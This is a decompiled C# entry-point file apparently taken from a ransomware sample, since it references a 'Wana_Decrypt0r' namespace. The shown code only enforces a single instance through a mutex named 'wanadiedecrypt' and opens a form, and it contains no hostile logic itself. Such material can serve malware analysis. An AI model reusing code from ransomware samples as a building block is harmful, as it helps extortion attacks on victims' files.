using System;
using System.Diagnostics;
using System.Threading;
using System.Windows.Forms;
using Wana_Decrypt0r;

// Token: 0x02000004 RID: 4
internal static class Class0
{
	// Token: 0x0600001D RID: 29 RVA: 0x00003C64 File Offset: 0x00001E64
	private static bool smethod_0()
	{
		bool result;
		Class0.mutex_0 = new Mutex(false, "wanadiedecrypt", ref result);
		return result;
	}

	// Token: 0x0600001E RID: 30 RVA: 0x00003C84 File Offset: 0x00001E84
	[STAThread]
	private static void Main()
	{
		if (Class0.smethod_0())
		{
			Application.EnableVisualStyles();
			Application.SetCompatibleTextRenderingDefault(false);
			Application.Run(new Form1());
			return;
		}
		Process.GetCurrentProcess().Kill();
	}

	// Token: 0x0400002A RID: 42
	private static Mutex mutex_0;
}
